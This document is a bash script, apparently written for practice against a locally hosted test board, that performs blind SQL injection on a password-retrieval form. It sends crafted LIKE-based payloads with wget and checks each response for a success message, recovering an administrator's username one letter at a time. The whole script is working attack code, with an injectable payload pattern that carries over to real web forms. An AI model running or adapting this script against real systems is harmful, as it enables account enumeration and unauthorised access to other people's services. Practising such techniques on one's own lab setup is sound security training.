#!/bin/bash
# A script to get an username of an admin from a local prepared board.
# practice blind SQL Injection
# its located at 127.0.0.1:8081
# our target is http://127.0.0.1:8081/retrieve_password
target=http://127.0.0.1:8081/retrieve_password
username="" 
mP1="username=' OR (username LIKE '" #Message Part 1
mP2="%' AND admin = 1) #"            # Part 2
stg="A message with your password got sent to your email address!" #Substring

while true 
do
  temp="" #for the response body
  for test in {a..z} #loop from a to z
  do
    #call website an put response into temp, "-O -" for no file output
    #and "-q" for no stdout
    temp=$(wget -O - -q --post-data "$mP1$username$test$mP2" $target)
    #check with grep for a substring only found on the correct site
    if grep -q "$stg" <<< $temp ; then
      username+=$test #append found string
      temp="" #set temp to null and break loop
      break
    fi
  done
  #if temp is null and a username is given -> username found.
  if [ -n "$temp" ] && [ -n "$username" ]; then
    break
  fi
done
echo "If found username is:"
echo $username
